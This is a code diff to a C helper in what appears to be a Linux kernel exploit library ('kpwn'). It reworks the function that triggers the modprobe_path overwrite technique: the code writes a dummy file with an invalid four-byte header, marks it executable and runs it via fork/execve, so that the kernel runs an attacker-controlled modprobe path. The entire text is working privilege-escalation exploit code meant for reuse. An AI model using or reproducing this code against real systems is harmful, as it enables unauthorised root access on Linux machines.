@@ -7,6 +7,7 @@
 #include <fcntl.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 int kpwn_overwrite_modprobe(void *kbase, size_t modprobe_path_off,
@@ -32,15 +33,17 @@ int kpwn_trigger_modprobe(const char *dummy_path) {
   ASSERT_MSG(dummy_path != NULL, "dummy_path is NULL");
 
   int fd = SYSCHK(open(dummy_path, O_WRONLY | O_CREAT | O_TRUNC, 0777));
-  char header[] = "\xff\xff\xff\xff";
-  SYSCHK(write(fd, header, sizeof(header)));
+  SYSCHK(write(fd, "\xff\xff\xff\xff", 4));
   close(fd);
 
-  char cmd[512];
-  snprintf(cmd, sizeof(cmd), "%s 2>/dev/null", dummy_path);
-
   log_info("[kpwn:overwrite] triggering modprobe via %s", dummy_path);
-  system(cmd);
+  pid_t p = fork();
+  if (p == 0) {
+    execve(dummy_path, (char *[]){(char *)dummy_path, NULL}, NULL);
+    _exit(127);
+  }
+  if (p > 0)
+    waitpid(p, NULL, 0);
   return 0;
 }
 
